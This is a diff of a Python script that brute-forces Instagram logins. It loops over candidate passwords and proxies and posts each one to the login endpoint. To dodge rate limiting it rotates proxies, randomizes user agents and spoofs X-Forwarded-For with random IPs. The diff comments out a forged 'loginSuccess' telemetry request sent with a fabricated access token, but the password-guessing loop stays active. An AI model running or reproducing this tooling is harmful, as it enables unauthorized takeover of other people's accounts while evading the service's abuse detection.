@@ -101,18 +101,18 @@ for pss in ps:
     for prx in proxy:
         try:
             proxi = {'http': prx}
-            sub = ('''qF0y9          Igw0E     IwRSH      eGOV_       acqo5   _4EzTm''')
+            #sub = ('''qF0y9          Igw0E     IwRSH      eGOV_       acqo5   _4EzTm''')
             print ()
             time.sleep(0.5)
             ips = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
             uid:str = (uuid.uuid4())
             headers = {'User-Agent': pyuseragents.random(),'Accept': "*/*",'Cookie': 'missing','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US','X-IG-Capabilities': '3brTvw==','X-IG-Connection-Type': 'WIFI','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'instagram.com','X-Forwarded-For': ips}
             server = (f'https://www.instagram.com/accounts/login/?next=/{user}/')
-            payload = {'uuid': uid,'password': pss,'username': user,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0', 'submit':'log in'}
+            #payload = {'uuid': uid,'password': pss,'username': user,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0', 'submit':'log in'}
             data = {'username': user, 'password': pss, 'uuid':uid, 'from_reg':'false', '_csrftoken': 'missing','login_attempt_countn':'0','submit':'log in'}
             #head = {"scheme": "https","host": "graph.instagram.com","filename": "/logging_client_events","remote": {"Address": ips}, 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'Vary': 'Origin', 'Content-Type': 'application/json; charset=UTF-8', 'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid OAuth 2.0 Access Token"', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=15552000', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'x-fb-request-id': 'AIW8vu6H6AHA7Cyatxu4elN', 'x-fb-trace-id': 'Buw1EXSZ+A4', 'x-fb-rev': '1005818168', 'X-FB-Debug': 'INvVSJKJQLRwye7IcRcym6LNOyjTqOJNUoki8RRdYuznsC5FvT4fzzGk0mYwaTuQBa0N7giOyS1K2f8N+nTNTA==', 'Date': 'Sat, 09 Jul 2022 19:13:17 GMT', 'X-FB-TRIP-ID': '1425083115', 'Connection': 'keep-alive', 'Content-Length': '45'}
-            host = 'https://graph.instagram.com'
-            hed = {'Host': host, 'User-Agent': pyuseragents.random(), 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'Vary': 'Origin', 'Content-Type': 'application/json; charset=UTF-8', 'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid OAuth 2.0 Access Token"', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=15552000', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'x-fb-request-id': 'AfEFkZ2G8RvQ8w6a9gFIKXt', 'x-fb-trace-id': 'CAiOl2db1BY', 'x-fb-rev': '1005818210', 'X-FB-Debug': 'fRa2DaGgArwlMQ5xPaM0H4ygWOLc1MbdJ+fNKKQg10Eghb+jCV+nFx3LiXkyJ65dmxm/XiC5wKc8R0yXjGJRgQ==', 'Date': 'Sat, 09 Jul 2022 21:07:37 GMT', 'X-FB-TRIP-ID': '1425083115', 'Connection': 'keep-alive', 'Content-Length': '45'}
+            #host = 'https://graph.instagram.com'
+            #hed = {'Host': host, 'User-Agent': pyuseragents.random(), 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'Vary': 'Origin', 'Content-Type': 'application/json; charset=UTF-8', 'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid OAuth 2.0 Access Token"', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=15552000', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'x-fb-request-id': 'AfEFkZ2G8RvQ8w6a9gFIKXt', 'x-fb-trace-id': 'CAiOl2db1BY', 'x-fb-rev': '1005818210', 'X-FB-Debug': 'fRa2DaGgArwlMQ5xPaM0H4ygWOLc1MbdJ+fNKKQg10Eghb+jCV+nFx3LiXkyJ65dmxm/XiC5wKc8R0yXjGJRgQ==', 'Date': 'Sat, 09 Jul 2022 21:07:37 GMT', 'X-FB-TRIP-ID': '1425083115', 'Connection': 'keep-alive', 'Content-Length': '45'}
             #try:
                 #req = requests.get(host)
             #except:
@@ -125,16 +125,16 @@ for pss in ps:
                 #message = req.json['message']
             #except:
                 #pass
-            adad = random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)
-            def choices():
-                hash = ''
-                hashs = [*'qwertyuiopasdfghjklzxcvbnm0123456789']
-                for m in range(32):
-                    hash += choice(hashs)
-                return hash
-            token = adad+choices()
+            #adad = random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)
+            #def choices():
+                #hash = ''
+                #hashs = [*'qwertyuiopasdfghjklzxcvbnm0123456789']
+                #for m in range(32):
+                    #hash += choice(hashs)
+                #return hash
+            #token = adad+choices()
             #json = {'access_token': token, 'message': message}
-            the = {'access_token': token,'message': '{\"app_id\":\"936619743392459\",\"app_ver\":\"1.0.0\",\"data\":[{\"time\":1657390570.175,\"name\":\"instagram_web_client_events\",\"extra\":{\"event_type\":\"action\",\"event_name\":\"loginSuccess\",\"mid\":\"YslyOQALAAHlCPDuzqWqZW4GIOTP\",\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"fb\":false,\"platform\":\"windows_nt_10\",\"source\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"},\"module\":\"loginPage\",\"obj_type\":\"url\",\"obj_id\":\"/accounts/login/?source=auth_switcher\"},{\"time\":1657390570.185,\"name\":\"instagram_web_time_spent_navigation\",\"extra\":{\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"event\":\"unload\",\"client_time\":1657390570184,\"time_spent_id\":\"qsqy2g\",\"extra_data\":{},\"source_endpoint\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"url\":\"/accounts/login/?source=auth_switcher\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"}}],\"log_type\":\"client_event\",\"seq\":16,\"session_id\":\"181e429fec8-13aece\",\"device_id\":\"3BAF6D5C-0E19-4B2C-A71F-B2A791E6C65C\",\"claims\":[\"hmac.AR251Qhmn7X4ARb3A9GGxEaSfeBq2qC24nBwdcMmq5I-TQna\"]}'}
+            #the = {'access_token': token,'message': '{\"app_id\":\"936619743392459\",\"app_ver\":\"1.0.0\",\"data\":[{\"time\":1657390570.175,\"name\":\"instagram_web_client_events\",\"extra\":{\"event_type\":\"action\",\"event_name\":\"loginSuccess\",\"mid\":\"YslyOQALAAHlCPDuzqWqZW4GIOTP\",\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"fb\":false,\"platform\":\"windows_nt_10\",\"source\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"},\"module\":\"loginPage\",\"obj_type\":\"url\",\"obj_id\":\"/accounts/login/?source=auth_switcher\"},{\"time\":1657390570.185,\"name\":\"instagram_web_time_spent_navigation\",\"extra\":{\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"event\":\"unload\",\"client_time\":1657390570184,\"time_spent_id\":\"qsqy2g\",\"extra_data\":{},\"source_endpoint\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"url\":\"/accounts/login/?source=auth_switcher\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"}}],\"log_type\":\"client_event\",\"seq\":16,\"session_id\":\"181e429fec8-13aece\",\"device_id\":\"3BAF6D5C-0E19-4B2C-A71F-B2A791E6C65C\",\"claims\":[\"hmac.AR251Qhmn7X4ARb3A9GGxEaSfeBq2qC24nBwdcMmq5I-TQna\"]}'}
             num = 0
             number = 10
             num = int(num)
@@ -157,13 +157,13 @@ for pss in ps:
                     exit (2)
                 except:
                     sys.exit()
-            try:
-                requests.post(host, headers=hed, json=the)
-            except:
-                try:
-                    requests.post(host, headers=hed, json=json)
-                except:
-                    pass
+            #try:
+                #requests.post(host, headers=hed, json=the)
+            #except:
+                #try:
+                    #requests.post(host, headers=hed, json=json)
+                #except:
+                    #pass
             rq = requests.post(server, headers=headers, data=data, proxies=proxi)
             _rq_ = BeautifulSoup(rq.text , 'html.parser')
             #if rq.status_code != 200:
